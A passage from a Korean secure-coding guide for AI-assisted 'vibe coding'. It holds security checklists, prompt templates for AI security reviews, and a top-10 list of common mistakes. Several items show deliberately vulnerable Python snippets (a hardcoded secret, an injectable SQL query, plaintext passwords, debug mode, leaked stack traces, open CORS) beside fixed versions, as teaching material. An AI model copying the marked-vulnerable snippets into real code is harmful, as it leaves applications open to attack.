- [ ] 세션 토큰 또는 JWT의 만료 시간이 적절하게 설정되어 있습니까?
- [ ] 로그아웃 시 서버 측에서 세션이 완전히 무효화됩니까?
- [ ] 관리자 페이지에 별도의 인가 검증이 적용되어 있습니까?
- [ ] API 엔드포인트마다 적절한 권한 검증이 이루어지고 있습니까?
- [ ] JWT 비밀키가 충분히 길고 복잡합니까?
- [ ] 비밀번호 재설정 토큰에 만료 시간이 설정되어 있습니까?

### 입력값 검증(Input Validation) 체크리스트

- [ ] 모든 사용자 입력에 대해 서버 측 검증이 구현되어 있습니까?
- [ ] 클라이언트 측 검증만으로 보안을 의존하고 있지 않습니까?
- [ ] SQL 쿼리에 매개변수화된 쿼리 또는 ORM을 사용하고 있습니까?
- [ ] 사용자 입력이 HTML에 출력될 때 적절히 이스케이프 처리되고 있습니까?
- [ ] 파일 업로드 시 파일 확장자, MIME 타입, 파일 크기를 검증하고 있습니까?
- [ ] 파일 업로드 경로에 경로 탐색 취약점이 없습니까?
- [ ] URL 리다이렉트 시 오픈 리다이렉트 취약점이 없습니까?
- [ ] POST 요청이 필요한 모든 폼에 CSRF 토큰이 포함되어 있습니까?

### 민감정보 보호(Sensitive Data Protection) 체크리스트

- [ ] API 키, 데이터베이스 비밀번호, JWT 시크릿 등이 소스코드에 하드코딩되어 있지 않습니까?
- [ ] `.env` 파일이 `.gitignore`에 포함되어 있습니까?
- [ ] Git 히스토리에 과거에 커밋된 비밀키가 남아 있지 않습니까?
- [ ] 에러 메시지에 스택 트레이스, 데이터베이스 스키마, 파일 경로 등 내부 정보가 노출되지 않습니까?
- [ ] 로그에 비밀번호, 토큰, 개인정보 등 민감한 데이터가 기록되지 않습니까?
- [ ] 데이터베이스에 저장된 민감 데이터가 암호화되어 있습니까?

### 에러 처리(Error Handling) 체크리스트

- [ ] 프로덕션 환경에서 상세한 에러 메시지가 사용자에게 노출되지 않습니까?
- [ ] 커스텀 에러 페이지(404, 500 등)가 구성되어 있습니까?
- [ ] 예외 처리가 적절히 구현되어 있습니까?

### 배포 설정(Deployment Configuration) 체크리스트

- [ ] HTTPS가 적용되어 있습니까?
- [ ] HTTP 요청이 자동으로 HTTPS로 리다이렉트됩니까?
- [ ] 디버그 모드가 비활성화되어 있습니까?
- [ ] 보안 관련 HTTP 헤더가 설정되어 있습니까?
    - [ ] `X-Content-Type-Options: nosniff`
    - [ ] `X-Frame-Options: DENY` 또는 `SAMEORIGIN`
    - [ ] `Strict-Transport-Security` (HSTS)
    - [ ] `Content-Security-Policy` (CSP)
- [ ] 데이터베이스가 외부 네트워크에서 직접 접근 불가능하도록 설정되어 있습니까?
- [ ] CORS 설정이 필요한 도메인만 허용하고 있습니까?

---

## 17-2. AI에게 보안 검토 요청하는 프롬프트 예시

### 프롬프트 1: 전체 보안 감사

```text
다음 코드에 대해 보안 감사를 수행해 주십시오.

아래 카테고리별로 취약점을 분석하고, 각 취약점에 대해
(1) 위험 등급(상/중/하), (2) 설명, (3) 수정된 코드를 제시해 주십시오.

검토 카테고리:
- SQL 삽입(SQL Injection)
- 크로스사이트 스크립트(XSS)
- 크로스사이트 요청 위조(CSRF)
- 인증 및 인가 결함
- 민감정보 노출
- 안전하지 않은 설정

[여기에 코드를 붙여넣으십시오]
```

### 프롬프트 2: 인증 시스템 집중 검토

```text
아래 코드는 사용자 인증(로그인/회원가입) 시스템입니다.
다음 항목을 중점적으로 검토해 주십시오.

1. 비밀번호가 안전한 해시 알고리즘으로 저장되는가?
2. 세션 또는 JWT 토큰 관리가 안전한가?
3. 브루트포스 공격에 대한 방어가 있는가?
4. 비밀번호 재설정 흐름이 안전한가?
5. 인가 검증이 모든 보호된 엔드포인트에 적용되어 있는가?

[여기에 인증 관련 코드를 붙여넣으십시오]
```

### 프롬프트 3: 배포 전 최종 보안 점검

```text
아래 코드를 프로덕션 환경에 배포하려고 합니다.
배포 전 최종 보안 점검을 수행해 주십시오.

체크 항목:
1. 디버그 모드가 비활성화되어 있는가?
2. HTTPS가 강제 적용되는가?
3. 보안 헤더(HSTS, CSP, X-Frame-Options 등)가 설정되어 있는가?
4. CORS 설정이 적절한가?
5. 에러 페이지가 내부 정보를 노출하지 않는가?
6. 로그에 민감한 정보가 기록되지 않는가?

[여기에 코드를 붙여넣으십시오]
```

### 프롬프트 4: Cursor/Claude Code 전용 — 보안 강화 코드 생성 요청

```text
다음 기능을 구현해 주십시오.
반드시 아래의 보안 요구사항을 모두 충족해야 합니다.

기능: [구현할 기능을 설명하십시오]

보안 요구사항:
- 모든 비밀키와 민감정보는 환경 변수에서 로드할 것
- SQL 쿼리는 반드시 매개변수화된 쿼리를 사용할 것
- 사용자 입력은 서버 측에서 반드시 검증할 것
- 비밀번호는 bcrypt로 해싱할 것
- CSRF 토큰을 모든 POST 폼에 포함할 것
- 에러 메시지에 내부 정보를 노출하지 말 것
- 디버그 모드는 환경 변수로 제어할 것

코드를 생성한 후, 본인이 생성한 코드에 대해 보안 자체 검토를 수행하고
잠재적 취약점이 있다면 함께 알려 주십시오.
```

---

## 17-3. 자주 발생하는 바이브 코딩 보안 실수 TOP 10

### 1위: 비밀키 하드코딩(Hardcoded Secrets)

```python
# ❌ 취약한 코드
SECRET_KEY = "my-secret-key-123"

# ✅ 안전한 코드
import os
SECRET_KEY = os.environ["SECRET_KEY"]
```

### 2위: SQL 삽입 취약 쿼리

```python
# ❌ 취약한 코드
query = f"SELECT * FROM users WHERE id = {user_id}"

# ✅ 안전한 코드
query = "SELECT * FROM users WHERE id = %s"
cursor.execute(query, (user_id,))
```

### 3위: 비밀번호 평문 저장

```python
# ❌ 취약한 코드
db.execute("INSERT INTO users (username, password) VALUES (?, ?)",
           (username, password))

# ✅ 안전한 코드
import bcrypt
password_hash = bcrypt.hashpw(password.encode('utf-8'), bcrypt.gensalt())
db.execute("INSERT INTO users (username, password_hash) VALUES (?, ?)",
           (username, password_hash))
```

### 4위: CSRF 토큰 누락

프레임워크의 CSRF 보호 기능을 반드시 활성화하고, 모든 폼에 CSRF 토큰 필드를 추가하십시오.

### 5위: 디버그 모드 활성화 상태로 배포

```python
# ❌ 취약한 코드
app.run(debug=True)

# ✅ 안전한 코드
import os
app.run(debug=os.environ.get("FLASK_DEBUG", "false").lower() == "true")
```

### 6위: 입력값 서버 측 검증 누락

모든 입력값은 반드시 서버 측에서 다시 검증해야 합니다. 클라이언트 검증은 사용자 편의를 위한 것이며, 보안을 위한 것이 아닙니다.

### 7위: 불충분한 에러 처리와 정보 노출

```python
# ❌ 취약한 코드
@app.errorhandler(Exception)
def handle_error(e):
    return jsonify({"error": str(e), "trace": traceback.format_exc()}), 500

# ✅ 안전한 코드
@app.errorhandler(Exception)
def handle_error(e):
    app.logger.error(f"Unhandled exception: {e}", exc_info=True)
    return jsonify({"error": "서버 내부 오류가 발생하였습니다."}), 500
```

### 8위: CORS 전체 허용

```python
# ❌ 취약한 코드
from flask_cors import CORS
CORS(app)  # 모든 출처 허용

# ✅ 안전한 코드
from flask_cors import CORS
CORS(app, origins=["https://yourdomain.com", "https://www.yourdomain.com"])
```

### 9위: 안전하지 않은 파일 업로드

파일 업로드 시 확장자, 크기, MIME 타입을 검증하고, 파일명을 UUID로 변경하여 저장하십시오.

### 10위: HTTPS 미적용 및 보안 헤더 누락

```python
# Flask에서 보안 헤더 설정
from flask_talisman import Talisman

Talisman(app,
    force_https=True,
    strict_transport_security=True,
    content_security_policy={
        'default-src': "'self'",
        'script-src': "'self'",
        'style-src': "'self' 'unsafe-inline'"
    }
)
```

> **⚠️ 주의:** 위 TOP 10 실수 중 1위부터 5위까지는 거의 모든 바이브 코딩 프로젝트에서 발견됩니다. 배포 전 최소한 이 5가지만이라도 반드시 점검하십시오.

### 바이브 코딩 시 체크포인트

- [ ] 위 TOP 10 항목을 모두 확인하고, 자신의 프로젝트에 해당되는 실수가 없는지 점검하였습니까?
- [ ] 1위~5위 항목에 대해 특히 주의 깊게 코드를 검토하였습니까?
- [ ] AI에게 코드를 생성 요청할 때 위 실수들을 방지하는 조건을 프롬프트에 포함하였습니까?
- [ ] 17-2절의 프롬프트 템플릿을 사용하여 AI에게 자동 보안 검토를 요청하였습니까?

> **💡 팁:** 이 TOP 10 목록을 프로젝트 저장소의 `SECURITY_CHECKLIST.md` 파일로 저장해 두면, 새로운 기능을 추가할 때마다 빠르게 참조할 수 있습니다. 또한 Cursor의 `.cursorrules` 파일이나 Claude Code의 `CLAUDE.md` 파일에 "위 10가지 보안 실수를 피하라"는 지침을 추가하면 AI가 처음부터 더 안전한 코드를 생성합니다.
